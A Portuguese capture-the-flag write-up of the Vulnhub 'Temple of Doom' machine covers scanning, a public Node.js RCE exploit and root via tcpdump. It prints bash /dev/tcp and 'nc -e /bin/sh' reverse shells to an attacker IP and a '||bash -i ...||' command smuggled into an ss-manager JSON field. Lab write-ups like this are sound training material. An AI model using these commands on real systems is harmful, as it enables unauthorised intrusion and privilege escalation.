---
title: Vulnhub - Temple of Doom 
categories: [Vulnhub]
#tags: []
---


![](/assets/img/Vulnhub/TempleOfDoom/capa.png)

## Link da Maquina: <https://www.vulnhub.com/entry/temple-of-doom-1,243/>




# Scan/Enumeracao


## Host Discovery


Com o comando **arp-scan** varremos a rede para descobrir os hosts ativos e consequentemente o IP do nosso alvo: **192.168.110.10**

```bash
sudo arp-scan -I eth1 192.168.110.0/24
```

![](/assets/img/Vulnhub/TempleOfDoom/host-discovery.png)


## Port Discovery


Com o parametro "-p-" do nmap varremos todas as portas possiveis do nosso alvo e encontramos 02 delas abertas. **22** e **666**

```bash
sudo nmap -n -T5 -p- 192.168.110.10
```

![](/assets/img/Vulnhub/TempleOfDoom/port-discovery.png)



## Port Scan


Agora com o parametro "-A" do nmap vamos descobrir mais informacoes sobre essas portas abertas do nosso alvo

```bash
sudo nmap -n -T5 -A -p 22,666 192.168.110.10
```

![](/assets/img/Vulnhub/TempleOfDoom/port-scan.png)

> - Porta 22:       ssh     OpenSSH 7.7 (protocol 2.0)
> - Porta 666:      http    Node.js Express framework


# Enumeracao/Exploracao Web - Porta 666

## Inspecao Visual

Analisando a pagina web da aplicacao nao temos nada de interessante

![](/assets/img/Vulnhub/TempleOfDoom/web-browser.png)



O codigo fonte da pagina tambem nao tem nada de relevante

![](/assets/img/Vulnhub/TempleOfDoom/web-codigoFonte.png)


## Fuzzy de diretorios - Gobuster

```bash
gobuster dir -u http://192.168.110.10:666 -w /usr/share/wordlists/dirb/big.txt -x js,txt,php,html
```

Nao encontramos nada como gobuster

![](/assets/img/Vulnhub/TempleOfDoom/gobuster.png)



## Enumeracao - Nikto

```bash
nikto -h http://192.168.110.10:666/ 
```

Rodamos o **nikto**, porem nao encontramos nada de util...

![](/assets/img/Vulnhub/TempleOfDoom/nikto.png)


## Exploit Publico - searchploit

Seguindo a metodologia, ja que nao encontramos nada na enumeracao manual, procuramos por um exploit publico para o servico que esta rodando na porta 666

```bash
searchsploit Node.js
```

![](/assets/img/Vulnhub/TempleOfDoom/searchsploit.png)



Encontramos dois exploits de **RCE** que a principio podem atender a necessidade. Vamos copiar o **nodejs/webapps/49552.py** para o diretorio atual

```bash
searchsploit -m 49552
```

![](/assets/img/Vulnhub/TempleOfDoom/searchsploit-m.png)


### Exploit 49552

Analisando o exploit vimos que exitem algumas informacoes que devem ser alteradas para usarmos

![](/assets/img/Vulnhub/TempleOfDoom/exploit.png)



#### rbscheat

O comando para retornar o shell reverso foi encontrado utilizando o programa **rbscheat** que pode ser encontrado no **[GitHub](https://github.com/marciosouza20/rbscheat)**. Para baixa-lo para a nossa maquina e so usar o git clone no repositorio e dar ```make install``` no diretorio criado pelo git clone

Procuramos por um comando de shell reverso com o bash

```bash
rbscheat -i 192.168.110.3:443 -l bash 
```

![](/assets/img/Vulnhub/TempleOfDoom/rbscheat.png)

> - **bash -i >& /dev/tcp/192.168.110.3/443 0<&1**


# Shell Reverso

Agora invocamos o bash e deixamos a mesma porta aberta que configuramos no exploit. Depois disso executamos o exploit e recebemos o shell do alvo 

```bash
python 49552.py 
```

![](/assets/img/Vulnhub/TempleOfDoom/exploit-exec.png)

```bash
bash
sudo nc -lnvp 443
```

![](/assets/img/Vulnhub/TempleOfDoom/shell-reverso.png)



## Shell Interativo

Para melhorar o shell os seguinte passos devem ser seguidos:

* Importar o tty no shell do alvo

```bash
script /dev/null
```

![](/assets/img/Vulnhub/TempleOfDoom/import-tty.png)

* Depois e preciso retornar para o shell da nossa maquina. Para isso basta apertar as teclas **CTRL+Z**

* No shell da kali inserimos os seguintes comando e no final apertar **ENTER** duas vezes

```bash
stty raw -echo 
fg
# ENTER duas vezes
```

![](/assets/img/Vulnhub/TempleOfDoom/shell-interativo.png)


# Usuario "nodeadmin"

## Escalando privilegio

Seguindo a metodologia revirei a maquina inteira atras de uma vulnerabilidade que me permitisse escalar privilegio. Encontrei depois de muito tempo, nos processos, algo sendo executado, filtrando pelo usuario fireman

```bash
ps -aux | grep fireman
```

![](/assets/img/Vulnhub/TempleOfDoom/nodeadmin-psAUX.png)



Primeiramente pesquisamos o que seria esse "**ss-manager**". Depois proocuramos por exploit para ele 

![](/assets/img/Vulnhub/TempleOfDoom/nodeadmin-exploit-ssmanager.png)


O exploit explica como funciona essa vulnerabilidade e exibe a prova de conceito. Ja que temos um exemplo vamos adapta-lo para a nossa realidade

![](/assets/img/Vulnhub/TempleOfDoom/nodeadmin-exploit43006.png)



# Usuario "fireman"

## Shell Reverso

Utilizando a prova de conceito do exploit como exemplo fiz da mesma forma alterando somente o comando que seria executado. Antes disso deixei a porta escutando na kali. Conseguimos receber o shell do usuario **fireman**

```bash
# Kali
rbscheat -i 192.168.110.3:4444 -l bash # Para gerar o comando do shell reverso
bash # Invocar o bash para melhoria do shell porteriormente
nc -lnvp 4444 # Deixar a porta escutando na maquina para receber o shell

# Alvo
nc -u 127.0.0.1 8839
add: {"server_port":8003, "password":"test", "method":"||bash -i >& /dev/tcp/192.168.110.3/4444 0<&1||"}
```

![](/assets/img/Vulnhub/TempleOfDoom/fireman-shell.png)



## Escalando Privilegio

Seguindo a metodologia verifiquei o que poderia ser executado como sudo e existem 03 binarios que podem ser executados

![](/assets/img/Vulnhub/TempleOfDoom/fireman-sudoL.png)


### GTFOBINS

Verifiquei no portal **[GTFOBINS](https://gtfobins.github.io/)** o que poderia ser explorado para conseguir escalar privilegio. Encontramos respostas promissoras para o **tcpdump**

![](/assets/img/Vulnhub/TempleOfDoom/gtfobins.png)



### TCPDUMP

Antes de explorar o binario tcpdump, e necessario criar um arquivo contendo o shell code e dar permissao de execucao para esse arquivo. Feito isso agora bastar executar o comando do tcpdump com os parametros informados

```bash
echo "nc -e /bin/sh 192.168.110.3 9999" > charlie
chmod +x charlie
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/charlie -Z root
```

![](/assets/img/Vulnhub/TempleOfDoom/fireman-tcpdump.png)



Antes de executar o processo supracitado e necessario deixar a porta escutando na kali para receber o shell

```bash
# >>Kali<<
bash
nc -lnvp 9999

# Recebeu o shell

# >>Alvo<<
script /dev/null
#CTRL+Z

# >>Kali<<
stty raw -echo
fg
#ENTER duas vezes

# >>Alvo<<
export TERM=xterm
```

![](/assets/img/Vulnhub/TempleOfDoom/root-shell.png)


# Usuario "root"

**Pronto, agora somos root!**

## Flag Root

Conseguimos pegar a flag do root

![](/assets/img/Vulnhub/TempleOfDoom/root-flag.png)


# Bonus

## Root

Na descricao da maquina diz existem duas formas de escalar privilegio para o root. Ainda nao achei a outra forma

## Shell nodeadmin

Existe outra forma para conseguir ganhar o primeiro shell da maquina. Resumindo...

* Quando recarrega a pagina ela da um erro. Joga para o Burp e econtra um cookie em base64. Decodificando e possivel verificar do que se trata...

* Pesquisando por exploit e possivel passar um comanndo em js encodado como base64 no cookie da requisicao e ganhar o primeiro shell reverso

